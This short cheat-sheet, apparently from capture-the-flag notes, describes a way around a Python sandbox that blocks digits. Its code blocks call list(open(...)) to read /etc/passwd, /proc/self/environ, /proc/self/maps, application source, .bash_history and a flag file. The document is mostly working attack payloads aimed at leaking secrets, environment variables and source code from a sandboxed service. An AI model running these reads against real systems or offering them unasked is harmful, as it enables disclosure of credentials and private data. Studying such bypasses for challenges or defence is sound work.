# Python Sandbox Digit-Filter Bypass

When a Python sandbox blocks digit characters (0-9) but allows `open()`, use `list()` to read files without numeric offsets:

```python
# Read file contents as a list of lines (no digits needed)
list(open('/etc/passwd'))
list(open('/proc/self/environ'))
list(open('/flag'))
```

Also useful for leaking source code when directory traversal paths are needed:
```python
list(open('/proc/self/cmdline'))   # current process cmdline
list(open('/proc/self/maps'))      # memory map (reveals app paths)
```

Once a path is known, read the source:
```python
list(open('/app/app.py'))
list(open('/home/user/.bash_history'))
```
